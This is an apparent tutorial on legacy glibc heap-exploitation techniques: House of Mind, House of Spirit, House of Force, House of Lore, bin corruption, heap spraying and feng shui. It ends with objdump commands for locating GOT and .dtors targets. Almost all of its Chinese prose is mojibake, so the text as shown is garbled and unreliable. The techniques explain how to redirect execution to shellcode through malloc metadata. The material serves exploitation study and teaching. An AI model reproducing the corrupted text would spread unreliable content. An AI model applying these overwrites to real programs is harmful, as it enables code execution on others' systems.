**å¿ƒçµä¹‹å±‹**

åªéœ€ä¸€æ¬¡free()è°ƒç”¨å³å¯å¼•å‘ä»»æ„ä»£ç çš„æ‰§è¡Œã€‚éœ€è¦å¯»æ‰¾ä¸€ä¸ªå¯ä»¥è¢«å…ˆå‰çš„å—æº¢å‡ºå¹¶é‡Šæ”¾çš„ç¬¬äºŒä¸ªå—ã€‚

ä¸€æ¬¡free()è°ƒç”¨ä¼šå¯¼è‡´è°ƒç”¨public\_fREe(mem)ï¼Œå®ƒæ‰§è¡Œï¼š

mstate ar\_ptr;

mchunkptr p;

â€¦

p = mem2chunk(mem); â€”> è¿”å›æŒ‡å‘å—å¼€å§‹çš„åœ°å€çš„æŒ‡é’ˆï¼ˆmem-8ï¼‰

â€¦

ar\_ptr = arena\_for\_chunk(p); â€”> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

â€¦

\_int\_free(ar\_ptr, mem);

}

åœ¨\[1]ä¸­æ£€æŸ¥sizeå­—æ®µçš„NON\_MAIN\_ARENAä½ï¼Œå¯ä»¥æ›´æ”¹ä»¥ä½¿æ£€æŸ¥è¿”å›trueå¹¶æ‰§è¡Œheap\_for\_ptr()ï¼Œè¯¥å‡½æ•°å¯¹â€œmemâ€è¿›è¡Œä¸è¿ç®—ï¼Œå°†2.5ä¸ªæœ€ä¸é‡è¦çš„å­—èŠ‚ç½®ä¸º0ï¼ˆåœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œä»0x0804a000å˜ä¸º0x08000000ï¼‰ï¼Œå¹¶è®¿é—®0x08000000->ar\_ptrï¼ˆå°±åƒæ˜¯ä¸€ä¸ªheap\_infoç»“æ„ï¼‰ã€‚

é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶ä¸€ä¸ªå—ï¼Œä¾‹å¦‚åœ¨0x0804a000ï¼Œå¹¶ä¸”è¦é‡Šæ”¾ä¸€ä¸ªå—åœ¨**0x081002a0**ï¼Œæˆ‘ä»¬å¯ä»¥åˆ°è¾¾åœ°å€0x08100000å¹¶å†™å…¥æˆ‘ä»¬æƒ³è¦çš„å†…å®¹ï¼Œä¾‹å¦‚**0x0804a000**ã€‚å½“ç¬¬äºŒä¸ªå—è¢«é‡Šæ”¾æ—¶ï¼Œheap\_for\_ptr(ptr)->ar\_ptrå°†è¿”å›æˆ‘ä»¬åœ¨0x08100000ä¸­å†™å…¥çš„å†…å®¹ï¼ˆå› ä¸ºå¯¹0x081002a0åº”ç”¨äº†ä¹‹å‰çœ‹åˆ°çš„ä¸è¿ç®—ï¼Œä»ä¸­æå–å‰4ä¸ªå­—èŠ‚çš„å€¼ï¼Œå³ar\_ptrï¼‰ã€‚

é€šè¿‡è¿™ç§æ–¹å¼è°ƒç”¨\_int\_free(ar\_ptr, mem)ï¼Œå³**\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
â€¦\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

æ­£å¦‚æˆ‘ä»¬ä¹‹å‰çœ‹åˆ°çš„ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶avçš„å€¼ï¼Œå› ä¸ºå®ƒæ˜¯æˆ‘ä»¬åœ¨è¦é‡Šæ”¾çš„å—ä¸­å†™å…¥çš„å†…å®¹ã€‚

æ ¹æ®unsorted\_chunksçš„å®šä¹‰ï¼Œæˆ‘ä»¬çŸ¥é“ï¼š\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

å› æ­¤ï¼Œå¦‚æœåœ¨av->bins\[2]ä¸­å†™å…¥\_\_DTOR\_END\_\_-12çš„å€¼ï¼Œåœ¨æœ€åä¸€æ¡æŒ‡ä»¤ä¸­å°†å†™å…¥\_\_DTOR\_END\_\_çš„åœ°å€ã€‚

ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ç¬¬ä¸€ä¸ªå—çš„å¼€å¤´ï¼Œæˆ‘ä»¬å¿…é¡»å¤šæ¬¡æ”¾å…¥\_\_DTOR\_END\_\_-12çš„åœ°å€ï¼Œå› ä¸ºav->bins\[2]å°†ä»é‚£é‡Œè·å–ã€‚

åœ¨è½å…¥ç¬¬äºŒä¸ªå—çš„åœ°å€æ—¶ï¼Œæœ€å5ä¸ªé›¶çš„åœ°å€ä¸­å¿…é¡»å†™å…¥æŒ‡å‘ç¬¬ä¸€ä¸ªå—çš„åœ°å€ï¼Œä»¥ä¾¿heap\_for\_ptr()è®¤ä¸ºar\_pträ½äºç¬¬ä¸€ä¸ªå—çš„å¼€å¤´ï¼Œå¹¶ä»ä¸­æå–av->bins\[2]ã€‚

åœ¨ç¬¬äºŒä¸ªå—ä¸­ï¼Œå¾—ç›Šäºç¬¬ä¸€ä¸ªå—ï¼Œæˆ‘ä»¬å°†prev\_sizeè¦†ç›–ä¸ºä¸€ä¸ªè·³è½¬0x0cï¼Œå¹¶å°†sizeè®¾ç½®ä¸ºæŸä¸ªå€¼ä»¥æ¿€æ´»-> NON\_MAIN\_ARENAã€‚

æ¥ä¸‹æ¥ï¼Œåœ¨å—2ä¸­æ”¾å…¥ä¸€å †nopsï¼Œæœ€åæ˜¯shellcodeã€‚

é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå°†è°ƒç”¨\_int\_free(TROZO1, TROZO2)ï¼Œå¹¶ç»§ç»­æ‰§è¡ŒæŒ‡ä»¤ä»¥åœ¨\_\_DTOR\_END\_\_ä¸­å†™å…¥TROZO2çš„prev\_sizeçš„åœ°å€ï¼Œè¯¥åœ°å€å°†è·³è½¬åˆ°shellcodeã€‚

è¦åº”ç”¨æ­¤æŠ€æœ¯ï¼Œè¿˜éœ€è¦æ»¡è¶³ä¸€äº›é¢å¤–çš„è¦æ±‚ï¼Œè¿™ä½¿å¾—è´Ÿè½½æ›´åŠ å¤æ‚ã€‚

æ­¤æŠ€æœ¯ä¸å†é€‚ç”¨ï¼Œå› ä¸ºå¯¹unlinkåº”ç”¨äº†å‡ ä¹ç›¸åŒçš„è¡¥ä¸ã€‚å®ƒä»¬æ¯”è¾ƒæ–°çš„æŒ‡å‘çš„åœ°å€æ˜¯å¦ä¹ŸæŒ‡å‘å®ƒè‡ªå·±ã€‚

**å¿«é€Ÿbin**

è¿™æ˜¯å¿ƒçµä¹‹å±‹çš„ä¸€ä¸ªå˜ä½“ã€‚

æˆ‘ä»¬å¸Œæœ›æ‰§è¡Œä»¥ä¸‹ä»£ç ï¼Œè¯¥ä»£ç åœ¨\_int\_free()å‡½æ•°çš„ç¬¬ä¸€æ¬¡æ£€æŸ¥åæ‰§è¡Œã€‚

fb = &(av->fastbins\[fastbin\_index(size)] â€”> å…¶ä¸­fastbin\_index(sz) â€”> (sz >> 3) - 2

â€¦

p->fd = \*fb

\*fb = p

é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå¦‚æœåœ¨â€œfbâ€ä¸­æ”¾å…¥æŒ‡å‘GOTä¸­æŸä¸ªå‡½æ•°çš„åœ°å€ï¼Œåˆ™åœ¨è¯¥åœ°å€ä¸­å°†æ”¾å…¥è¢«è¦†ç›–çš„å—çš„åœ°å€ã€‚ä¸ºæ­¤ï¼Œarenaå¿…é¡»æ¥è¿‘dtorsçš„åœ°å€ã€‚æ›´ç¡®åˆ‡åœ°è¯´ï¼Œav->max\_fastå¿…é¡»åœ¨æˆ‘ä»¬è¦è¦†ç›–çš„åœ°å€ã€‚

ç”±äºåœ¨å¿ƒçµä¹‹å±‹ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°æˆ‘ä»¬æ§åˆ¶äº†avçš„ä½ç½®ã€‚

å› æ­¤ï¼Œå¦‚æœåœ¨sizeå­—æ®µä¸­æ”¾å…¥8 + NON\_MAIN\_ARENA + PREV\_INUSE â€”> fastbin\_index()å°†è¿”å›fastbins\[-1]ï¼Œè¿™å°†æŒ‡å‘av->max\_fastã€‚

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œav->max\_fastå°†æ˜¯è¦è¢«è¦†ç›–çš„åœ°å€ï¼ˆè€Œä¸æ˜¯æŒ‡å‘çš„åœ°å€ï¼Œè€Œæ˜¯è¯¥ä½ç½®å°†è¢«è¦†ç›–ï¼‰ã€‚

æ­¤å¤–ï¼Œå¿…é¡»æ»¡è¶³é‡Šæ”¾çš„ç›¸é‚»å—å¿…é¡»å¤§äº8çš„æ¡ä»¶-> ç”±äºæˆ‘ä»¬è¯´é‡Šæ”¾çš„å—çš„sizeä¸º8ï¼Œå› æ­¤åœ¨è¿™ä¸ªä¼ªé€ çš„å—ä¸­åªéœ€æ”¾å…¥ä¸€ä¸ªå¤§äº8çš„sizeï¼ˆè€Œä¸”ç”±äºshellcodeå°†æ”¾åœ¨é‡Šæ”¾çš„å—ä¸­ï¼Œå› æ­¤åœ¨å¼€å¤´éœ€è¦æ”¾å…¥ä¸€ä¸ªjmpï¼Œä»¥ä¾¿è½å…¥nopsï¼‰ã€‚

æ­¤å¤–ï¼Œè¯¥ä¼ªé€ å—å¿…é¡»å°äºav->system\_memã€‚av->system\_memä½äºè¯¥ä½ç½®ä¸Šæ–¹1848å­—èŠ‚ã€‚

ç”±äº\_\_DTOR\_END\_çš„é›¶å’ŒGOTä¸­çš„å°‘é‡åœ°å€ï¼Œè¿™äº›éƒ¨åˆ†ä¸­çš„ä»»ä½•åœ°å€éƒ½æ— æ³•è¢«è¦†ç›–ï¼Œå› æ­¤è®©æˆ‘ä»¬çœ‹çœ‹å¦‚ä½•åº”ç”¨å¿«é€Ÿbinæ¥æ”»å‡»å †æ ˆã€‚

å¦ä¸€ç§æ”»å‡»æ–¹å¼æ˜¯å°†**av**é‡å®šå‘åˆ°å †æ ˆã€‚

å¦‚æœæˆ‘ä»¬å°†sizeä¿®æ”¹ä¸º16è€Œä¸æ˜¯8ï¼Œåˆ™ï¼šfastbin\_index()å°†è¿”å›fastbins\[0]ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥è¦†ç›–å †æ ˆã€‚

ä¸ºæ­¤ï¼Œå †æ ˆä¸­ä¸èƒ½æœ‰ä»»ä½•canaryæˆ–å¥‡æ€ªçš„å€¼ï¼Œå®é™…ä¸Šæˆ‘ä»¬å¿…é¡»å¤„äºæ­¤çŠ¶æ€ï¼š4ä¸ªé›¶å­—èŠ‚ + EBP + RETã€‚

4ä¸ªé›¶å­—èŠ‚æ˜¯å¿…éœ€çš„ï¼Œå› ä¸º**av**å°†ä½äºè¯¥åœ°å€ï¼Œå¹¶ä¸”**av**çš„ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯å¿…é¡»ä¸º0çš„äº’æ–¥ä½“ã€‚

**av->max\_fast**å°†æ˜¯EBPï¼Œå¹¶ä¸”å°†æ˜¯ä¸€ä¸ªå€¼ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æ¥è·³è¿‡é™åˆ¶ã€‚

åœ¨**av->fastbins\[0]**ä¸­å°†è¢«è¦†ç›–ä¸º**p**çš„åœ°å€ï¼Œå¹¶å°†æ˜¯RETï¼Œå› æ­¤å°†è·³è½¬åˆ°shellcodeã€‚

æ­¤å¤–ï¼Œåœ¨**av->system\_mem**ï¼ˆåœ¨å †æ ˆä½ç½®ä¸Šæ–¹1484å­—èŠ‚ï¼‰å°†æœ‰è¶³å¤Ÿçš„åƒåœ¾ï¼Œå…è®¸æˆ‘ä»¬è·³è¿‡è¿›è¡Œçš„æ£€æŸ¥ã€‚

æ­¤å¤–ï¼Œå¿…é¡»æ»¡è¶³é‡Šæ”¾çš„ç›¸é‚»å—å¿…é¡»å¤§äº8çš„æ¡ä»¶-> ç”±äºæˆ‘ä»¬è¯´é‡Šæ”¾çš„å—çš„sizeä¸º16ï¼Œå› æ­¤åœ¨è¿™ä¸ªä¼ªé€ çš„å—ä¸­åªéœ€æ”¾å…¥ä¸€ä¸ªå¤§äº8çš„sizeï¼ˆè€Œä¸”ç”±äºshellcodeå°†æ”¾åœ¨é‡Šæ”¾çš„å—ä¸­ï¼Œå› æ­¤åœ¨å¼€å¤´éœ€è¦æ”¾å…¥ä¸€ä¸ªjmpï¼Œä»¥ä¾¿è½å…¥nopsï¼Œè¿™äº›nopsä½äºæ–°ä¼ªé€ å—çš„sizeå­—æ®µä¹‹åï¼‰ã€‚

**ç²¾ç¥ä¹‹å±‹**

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¸Œæœ›æ‹¥æœ‰ä¸€ä¸ªå¯ä»¥è¢«æ”»å‡»è€…ä¿®æ”¹çš„mallocæŒ‡é’ˆï¼ˆä¾‹å¦‚ï¼ŒæŒ‡é’ˆä½äºå¯èƒ½æº¢å‡ºçš„å˜é‡ä¸‹æ–¹çš„å †æ ˆä¸­ï¼‰ã€‚

è¿™æ ·ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿è¯¥æŒ‡é’ˆæŒ‡å‘ä»»ä½•åœ°æ–¹ã€‚ç„¶è€Œï¼Œå¹¶éæ‰€æœ‰ä½ç½®éƒ½æ˜¯æœ‰æ•ˆçš„ï¼Œä¼ªé€ å—çš„å¤§å°å¿…é¡»å°äºav->max\_fastï¼Œæ›´å…·ä½“åœ°è¯´ï¼Œå¿…é¡»ç­‰äºæœªæ¥malloc()è°ƒç”¨ä¸­è¯·æ±‚çš„å¤§å°+8ã€‚å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬çŸ¥é“åœ¨æ­¤å¯å˜æŒ‡é’ˆåé¢è°ƒç”¨malloc(40)ï¼Œåˆ™ä¼ªé€ å—çš„å¤§å°å¿…é¡»ç­‰äº48ã€‚

ä¾‹å¦‚ï¼Œå¦‚æœç¨‹åºè¯¢é—®ç”¨æˆ·ä¸€ä¸ªæ•°å­—ï¼Œæˆ‘ä»¬å¯ä»¥è¾“å…¥48å¹¶å°†å¯ä¿®æ”¹çš„mallocæŒ‡é’ˆæŒ‡å‘æ¥ä¸‹æ¥çš„4ä¸ªå­—èŠ‚ï¼ˆå¦‚æœè¿æ°”å¥½ï¼Œå¯èƒ½å±äºEBPï¼Œå› æ­¤48åœ¨åé¢ï¼Œåƒæ˜¯å¤´éƒ¨sizeï¼‰ã€‚æ­¤å¤–ï¼Œåœ°å€ptr-4+48å¿…é¡»æ»¡è¶³å¤šä¸ªæ¡ä»¶ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ptr=EBPï¼‰ï¼Œå³8 < ptr-4+48 < av->system\_memã€‚

å¦‚æœæ»¡è¶³è¿™äº›æ¡ä»¶ï¼Œå½“è°ƒç”¨æˆ‘ä»¬ä¹‹å‰æåˆ°çš„ä¸‹ä¸€ä¸ªmallocæ—¶ï¼Œå°†åˆ†é…EBPçš„åœ°å€ã€‚å¦‚æœæ”»å‡»è€…è¿˜å¯ä»¥æ§åˆ¶å†™å…¥æ­¤mallocçš„å†…å®¹ï¼Œåˆ™å¯ä»¥ç”¨æ‰€éœ€çš„åœ°å€è¦†ç›–EBPå’ŒEIPã€‚

æˆ‘è®¤ä¸ºè¿™æ˜¯å› ä¸ºå½“free()é‡Šæ”¾æ—¶ï¼Œå®ƒå°†è®°å½•åœ¨æŒ‡å‘å †æ ˆçš„EBPçš„åœ°å€ä¸Šæœ‰ä¸€ä¸ªå®Œç¾å¤§å°çš„å—ï¼Œä»¥ä¾¿ä¸ºæ–°çš„malloc()åˆ†é…ï¼Œå› æ­¤å°†åˆ†é…è¯¥åœ°å€ã€‚

**åŠ›é‡ä¹‹å±‹**

éœ€è¦ï¼š

* æº¢å‡ºä¸€ä¸ªå—ä»¥è¦†ç›–wilderness
* ä¸€æ¬¡malloc()è°ƒç”¨ï¼Œå¤§å°ç”±ç”¨æˆ·å®šä¹‰
* ä¸€æ¬¡malloc()è°ƒç”¨ï¼Œå…¶æ•°æ®å¯ä»¥ç”±ç”¨æˆ·å®šä¹‰

é¦–å…ˆï¼Œè¦†ç›–wildernesså—çš„sizeä¸ºä¸€ä¸ªéå¸¸å¤§çš„å€¼ï¼ˆ0xffffffffï¼‰ï¼Œå› æ­¤ä»»ä½•è¶³å¤Ÿå¤§çš„å†…å­˜è¯·æ±‚å°†åœ¨\_int\_malloc()ä¸­å¤„ç†ï¼Œè€Œæ— éœ€æ‰©å±•å †ã€‚

å…¶æ¬¡ï¼Œä¿®æ”¹av->topä»¥æŒ‡å‘æ”»å‡»è€…æ§åˆ¶çš„å†…å­˜åŒºåŸŸï¼Œä¾‹å¦‚å †æ ˆã€‚åœ¨av->topä¸­æ”¾å…¥\&EIP - 8ã€‚

æˆ‘ä»¬å¿…é¡»è¦†ç›–av->topä»¥æŒ‡å‘æ”»å‡»è€…æ§åˆ¶çš„å†…å­˜åŒºåŸŸï¼š

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victimè·å–å½“å‰wildernesså—çš„åœ°å€ï¼ˆå½“å‰çš„av->topï¼‰ï¼Œè€Œremainderæ­£å¥½æ˜¯è¯¥åœ°å€åŠ ä¸Šmalloc()è¯·æ±‚çš„å­—èŠ‚æ•°ã€‚å› æ­¤ï¼Œå¦‚æœ\&EIP-8åœ¨0xbffff224ï¼Œav->topåŒ…å«0x080c2788ï¼Œåˆ™æˆ‘ä»¬åœ¨æ§åˆ¶çš„mallocä¸­éœ€è¦ä¿ç•™çš„æ•°é‡ï¼Œä»¥ä¾¿av->topæŒ‡å‘$EIP-8çš„ä¸‹ä¸€ä¸ªmalloc()å°†æ˜¯ï¼š

0xbffff224 - 0x080c2788 = 3086207644ã€‚

å› æ­¤ï¼Œav->topå°†ä¿å­˜è¢«ä¿®æ”¹çš„å€¼ï¼Œä¸‹ä¸€ä¸ªmallocå°†æŒ‡å‘EIPå¹¶èƒ½å¤Ÿè¦†ç›–å®ƒã€‚

é‡è¦çš„æ˜¯ï¼Œæ–°çš„wildernesså—çš„sizeå¿…é¡»å¤§äºæœ€åä¸€æ¬¡malloc()è¯·æ±‚çš„å¤§å°ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœwildernessæŒ‡å‘\&EIP-8ï¼Œsizeå°†æ­£å¥½ä½äºå †æ ˆçš„EBPå­—æ®µä¸­ã€‚

**ä¼ è¯´ä¹‹å±‹**

**SmallBinè…è´¥**

é‡Šæ”¾çš„å—æ ¹æ®å…¶å¤§å°æ’å…¥binã€‚ä½†åœ¨æ’å…¥ä¹‹å‰ï¼Œå®ƒä»¬ä¼šä¿å­˜åœ¨æœªæ’åºçš„binsä¸­ã€‚é‡Šæ”¾çš„å—ä¸ä¼šç«‹å³æ”¾å…¥å…¶binï¼Œè€Œæ˜¯åœç•™åœ¨æœªæ’åºçš„binsä¸­ã€‚æ¥ä¸‹æ¥ï¼Œå¦‚æœè¯·æ±‚ä¸€ä¸ªæ–°çš„å—å¹¶ä¸”ä¹‹å‰é‡Šæ”¾çš„å—å¯ä»¥ä½¿ç”¨ï¼Œåˆ™å°†å…¶è¿”å›ï¼Œä½†å¦‚æœè¯·æ±‚æ›´å¤§çš„å—ï¼Œåˆ™æœªæ’åºçš„binsä¸­çš„é‡Šæ”¾å—å°†æ”¾å…¥å…¶é€‚å½“çš„binä¸­ã€‚

è¦è¾¾åˆ°æ˜“å—æ”»å‡»çš„ä»£ç ï¼Œå†…å­˜è¯·æ±‚å¿…é¡»å¤§äºav->max\_fastï¼ˆé€šå¸¸ä¸º72ï¼‰ä¸”å°äºMIN\_LARGE\_SIZEï¼ˆ512ï¼‰ã€‚

å¦‚æœbinsä¸­æœ‰é€‚åˆè¯·æ±‚çš„å—ï¼Œåˆ™åœ¨è§£é™¤é“¾æ¥åè¿”å›è¯¥å—ï¼š

bck = victim->bk; æŒ‡å‘å‰ä¸€ä¸ªå—ï¼Œè¿™æ˜¯æˆ‘ä»¬å¯ä»¥æ›´æ”¹çš„å”¯ä¸€ä¿¡æ¯ã€‚

bin->bk = bck; å€’æ•°ç¬¬äºŒä¸ªå—å˜ä¸ºæœ€åä¸€ä¸ªå—ï¼Œå¦‚æœbckæŒ‡å‘å †æ ˆï¼Œåˆ™ä¸‹ä¸€ä¸ªè¯·æ±‚çš„å—å°†è·å¾—æ­¤åœ°å€ã€‚

bck->fd = bin; å…³é—­åˆ—è¡¨ï¼Œä½¿å…¶æŒ‡å‘binã€‚

éœ€è¦ï¼š

è¯·æ±‚ä¸¤ä¸ªmallocï¼Œä»¥ä¾¿åœ¨ç¬¬ä¸€ä¸ªmallocé‡Šæ”¾åå¯ä»¥æº¢å‡ºç¬¬äºŒä¸ªmallocï¼ˆå³ï¼Œåœ¨è¿›è¡Œæº¢å‡ºä¹‹å‰è¯·æ±‚ä¸€ä¸ªå¤§äºç¬¬äºŒä¸ªå—çš„mallocï¼‰ã€‚

è¯·æ±‚çš„mallocçš„åœ°å€ç”±æ”»å‡»è€…æ§åˆ¶ã€‚

ç›®æ ‡å¦‚ä¸‹ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥å¯¹ä¸€ä¸ªå †è¿›è¡Œæº¢å‡ºï¼Œè€Œå…¶ä¸‹æ–¹æœ‰ä¸€ä¸ªå·²é‡Šæ”¾çš„å—å¹¶åœ¨å…¶binä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ›´æ”¹å…¶bkæŒ‡é’ˆã€‚å¦‚æœæˆ‘ä»¬æ›´æ”¹å…¶bkæŒ‡é’ˆï¼Œå¹¶ä¸”è¯¥å—æˆä¸ºbinåˆ—è¡¨çš„ç¬¬ä¸€ä¸ªå—å¹¶è¢«è¯·æ±‚ï¼Œåˆ™å°†æ¬ºéª—binï¼Œä½¿å…¶è®¤ä¸ºåˆ—è¡¨ä¸­çš„æœ€åä¸€ä¸ªå—ï¼ˆä¸‹ä¸€ä¸ªæä¾›çš„å—ï¼‰ä½äºæˆ‘ä»¬æ”¾ç½®çš„è™šå‡åœ°å€ï¼ˆä¾‹å¦‚å †æ ˆæˆ–GOTï¼‰ã€‚å› æ­¤ï¼Œå¦‚æœå†æ¬¡è¯·æ±‚å¦ä¸€ä¸ªå—ï¼Œå¹¶ä¸”æ”»å‡»è€…åœ¨å…¶ä¸­å…·æœ‰æƒé™ï¼Œåˆ™å°†æä¾›ä¸€ä¸ªå—åœ¨æ‰€éœ€ä½ç½®ï¼Œå¹¶ä¸”å¯ä»¥åœ¨å…¶ä¸­å†™å…¥ã€‚

åœ¨é‡Šæ”¾ä¿®æ”¹åçš„å—åï¼Œå¿…é¡»è¯·æ±‚ä¸€ä¸ªå¤§äºé‡Šæ”¾çš„å—ï¼Œè¿™æ ·ä¿®æ”¹åçš„å—å°†ä»æœªæ’åºçš„binsä¸­ç§»å‡ºå¹¶æ”¾å…¥å…¶binä¸­ã€‚

ä¸€æ—¦åœ¨å…¶binä¸­ï¼Œæ˜¯æ—¶å€™é€šè¿‡æº¢å‡ºä¿®æ”¹å…¶bkæŒ‡é’ˆï¼Œä»¥ä¾¿æŒ‡å‘æˆ‘ä»¬æƒ³è¦è¦†ç›–çš„åœ°å€ã€‚

å› æ­¤ï¼Œbinå°†ç­‰å¾…è¶³å¤Ÿå¤šçš„malloc()è°ƒç”¨ï¼Œä»¥ä¾¿å†æ¬¡ä½¿ç”¨ä¿®æ”¹åçš„binå¹¶æ¬ºéª—binï¼Œä½¿å…¶ç›¸ä¿¡ä¸‹ä¸€ä¸ªå—ä½äºè™šå‡åœ°å€ã€‚ç„¶åå°†æä¾›æˆ‘ä»¬æ„Ÿå…´è¶£çš„å—ã€‚

ä¸ºäº†å°½å¿«æ‰§è¡Œæ¼æ´ï¼Œç†æƒ³æƒ…å†µä¸‹åº”ä¸ºï¼šè¯·æ±‚æ˜“å—æ”»å‡»çš„å—ï¼Œè¯·æ±‚å°†è¢«ä¿®æ”¹çš„å—ï¼Œé‡Šæ”¾è¯¥å—ï¼Œè¯·æ±‚ä¸€ä¸ªå¤§äºå°†è¢«ä¿®æ”¹çš„å—ï¼Œä¿®æ”¹è¯¥å—ï¼ˆæ¼æ´ï¼‰ï¼Œè¯·æ±‚ä¸€ä¸ªä¸è¢«ä¿®æ”¹çš„å—ç›¸åŒå¤§å°çš„å—ï¼Œå¹¶è¯·æ±‚ç¬¬äºŒä¸ªç›¸åŒå¤§å°çš„å—ï¼Œè¿™å°†æŒ‡å‘æ‰€é€‰åœ°å€ã€‚

ä¸ºäº†ä¿æŠ¤æ­¤æ”»å‡»ï¼Œä½¿ç”¨äº†å…¸å‹çš„æ£€æŸ¥ï¼Œä»¥ç¡®ä¿å—â€œä¸æ˜¯â€è™šå‡çš„ï¼šæ£€æŸ¥bck->fdæ˜¯å¦æŒ‡å‘victimã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨æˆ‘ä»¬çš„æƒ…å†µä¸‹ï¼Œæ£€æŸ¥æŒ‡å‘å †æ ˆä¸­è™šå‡å—çš„fd*æŒ‡é’ˆæ˜¯å¦æŒ‡å‘victimã€‚ä¸ºäº†ç»•è¿‡æ­¤ä¿æŠ¤ï¼Œæ”»å‡»è€…åº”èƒ½å¤Ÿä»¥æŸç§æ–¹å¼ï¼ˆå¯èƒ½é€šè¿‡å †æ ˆï¼‰åœ¨é€‚å½“çš„åœ°å€å†™å…¥victimçš„åœ°å€ã€‚ä»¥ä¾¿çœ‹èµ·æ¥åƒä¸€ä¸ªçœŸå®çš„å—ã€‚

**LargeBinè…è´¥**

éœ€è¦ä¸ä¹‹å‰ç›¸åŒçš„è¦æ±‚ä»¥åŠæ›´å¤šè¦æ±‚ï¼Œæ­¤å¤–ï¼Œåˆ†é…çš„å—å¿…é¡»å¤§äº512ã€‚

æ”»å‡»ä¸ä¹‹å‰ç›¸åŒï¼Œå³éœ€è¦ä¿®æ”¹bkæŒ‡é’ˆå¹¶éœ€è¦æ‰€æœ‰è¿™äº›malloc()è°ƒç”¨ï¼Œä½†è¿˜éœ€è¦ä¿®æ”¹ä¿®æ”¹å—çš„sizeï¼Œä»¥ä¾¿è¯¥size - nb < MINSIZEã€‚

ä¾‹å¦‚ï¼Œå°†sizeè®¾ç½®ä¸º1552ï¼Œä»¥ä¾¿1552 - 1544 = 8 < MINSIZEï¼ˆå‡æ³•ä¸èƒ½ä¸ºè´Ÿï¼Œå› ä¸ºæ¯”è¾ƒçš„æ˜¯æ— ç¬¦å·æ•°ï¼‰ã€‚

æ­¤å¤–ï¼Œå·²å¼•å…¥è¡¥ä¸ä»¥ä½¿å…¶æ›´åŠ å¤æ‚ã€‚

**å †å–·æ¶‚**

åŸºæœ¬ä¸Šæ˜¯è¯·æ±‚å°½å¯èƒ½å¤šçš„å †å†…å­˜ï¼Œå¹¶ç”¨ä¸€å±‚nopså’Œshellcodeå¡«å……è¿™äº›å†…å­˜ã€‚æ­¤å¤–ï¼Œä½œä¸ºå«å­ä½¿ç”¨0x0cã€‚å› ä¸ºå°†å°è¯•è·³è½¬åˆ°åœ°å€0x0c0c0c0cï¼Œå› æ­¤å¦‚æœè¦†ç›–äº†å°†è¦è°ƒç”¨çš„æŸä¸ªåœ°å€ï¼Œåˆ™å°†è·³è½¬åˆ°é‚£é‡Œã€‚åŸºæœ¬ä¸Šï¼Œç­–ç•¥æ˜¯è¯·æ±‚å°½å¯èƒ½å¤šçš„å†…å­˜ï¼Œä»¥æŸ¥çœ‹æ˜¯å¦è¦†ç›–äº†æŸä¸ªæŒ‡é’ˆå¹¶è·³è½¬åˆ°0x0c0c0c0cï¼ŒæœŸå¾…é‚£é‡Œæœ‰nopsã€‚

**å †é£æ°´**

é€šè¿‡è¯·æ±‚å’Œé‡Šæ”¾å†…å­˜ï¼Œå®‰æ’å†…å­˜ï¼Œä½¿å¾—åœ¨ç©ºé—²å—ä¹‹é—´ç•™æœ‰å·²åˆ†é…çš„å—ã€‚è¦æº¢å‡ºçš„ç¼“å†²åŒºå°†ä½äºå…¶ä¸­ä¸€ä¸ªâ€œè›‹â€ä¸­ã€‚

**objdump -d å¯æ‰§è¡Œæ–‡ä»¶** â€”> åæ±‡ç¼–å‡½æ•°\
**objdump -d ./PROGRAMA | grep FUNCION** â€”> è·å–å‡½æ•°åœ°å€\
**objdump -d -Mintel ./shellcodeout** â€”> æŸ¥çœ‹æ˜¯å¦ç¡®å®æ˜¯æˆ‘ä»¬çš„shellcodeå¹¶æå–æ“ä½œç \
**objdump -t ./exec | grep varBss** â€”> ç¬¦å·è¡¨ï¼Œä»¥æå–å˜é‡å’Œå‡½æ•°çš„åœ°å€\
**objdump -TR ./exec | grep exit(func lib)** â€”> æå–åº“å‡½æ•°çš„åœ°å€ï¼ˆGOTï¼‰\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** â€”> æå–è¦åœ¨GOTä¸­è¦†ç›–çš„putsåœ°å€\
**objdump -D ./exec** â€”> åæ±‡ç¼–æ‰€æœ‰å†…å®¹ï¼Œç›´åˆ°pltçš„æ¡ç›®\
**objdump -p -/exec**\
**Info functions strncmp â€”>** gdbä¸­å‡½æ•°çš„ä¿¡æ¯

## æœ‰è¶£çš„è¯¾ç¨‹

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **å‚è€ƒæ–‡çŒ®**

